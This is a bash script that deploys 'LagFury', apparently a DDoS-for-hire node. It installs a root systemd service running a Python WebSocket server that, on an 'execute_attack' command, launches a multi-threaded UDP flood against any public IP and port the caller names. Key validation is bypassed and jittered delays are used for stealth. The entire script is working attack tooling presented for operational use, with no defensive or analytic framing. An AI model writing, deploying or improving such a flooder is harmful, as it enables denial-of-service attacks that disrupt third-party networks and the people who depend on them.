#!/bin/bash
# LagFury Deployment Suite with Stealth UDP Flood Backend

set -e

INSTALL_DIR="/opt/lagfury"
SERVICE_NAME="lagfury"
PY_SCRIPT="ws_server.py"

# Step 1: Environment Prep
echo "[*] Installing dependencies..."
apt update && apt install -y python3 python3-pip screen
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Step 2: Deploy ws_server.py
cat > $PY_SCRIPT << 'EOF'
import asyncio
import json
import socket
import threading
import time
import random
import logging
import websockets

logging.basicConfig(filename="attack_validation.log", level=logging.INFO)
session_validated = {}

def adaptive_delay():
    return random.uniform(0.2, 0.7)

def udp_flood(ip, port, duration):
    print(f"[ATTACK] UDP flood STARTED to {ip}:{port} for {duration}s")
    end = time.time() + duration

    def spam():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end:
            try:
                payload = random._urandom(random.randint(100, 1400))
                sock.sendto(payload, (ip, port))
                time.sleep(adaptive_delay())
            except Exception as e:
                time.sleep(1)
        sock.close()

    threads = []
    for _ in range(10):
        t = threading.Thread(target=spam)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def is_public_ip(ip):
    return not (ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("172.16.") or ip.startswith("127."))

def validate_key(key, hwid):
    print("[VALIDATION] Bypassed for test - key:", key, "HWID:", hwid)
    return True

async def handler(websocket):
    async for message in websocket:
        try:
            print("[RECEIVED]", message)
            data = json.loads(message)

            if data.get("command") != "execute_attack":
                await websocket.send("Invalid command.")
                continue

            key = data.get("key")
            hwid = data.get("hwid")
            ip = data.get("target_ip")
            port = int(data.get("target_port"))
            duration = int(data.get("duration"))

            if not validate_key(key, hwid):
                await websocket.send("AUTH_FAILED: Invalid or expired key.")
                continue

            if not is_public_ip(ip):
                await websocket.send("Blocked non-public IP target.")
                continue

            print(f"[DISPATCH] UDP flood to {ip}:{port} for {duration}s")
            threading.Thread(target=udp_flood, args=(ip, port, duration)).start()
            await websocket.send("UDP flood dispatched.")

        except Exception as e:
            await websocket.send(f"Error occurred: {str(e)}")

async def main():
    async with websockets.serve(handler, "0.0.0.0", 5002):
        print("[+] WebSocket server running on port 5002")
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
EOF

# Step 3: Create Systemd Service
cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=LagFury Swarm Node
After=network.target

[Service]
ExecStart=/usr/bin/python3 $INSTALL_DIR/$PY_SCRIPT
WorkingDirectory=$INSTALL_DIR
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

# Step 4: Enable & Launch
echo "[*] Enabling service..."
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME

echo "[+] LagFury UDP-only stealth node deployed and operational."
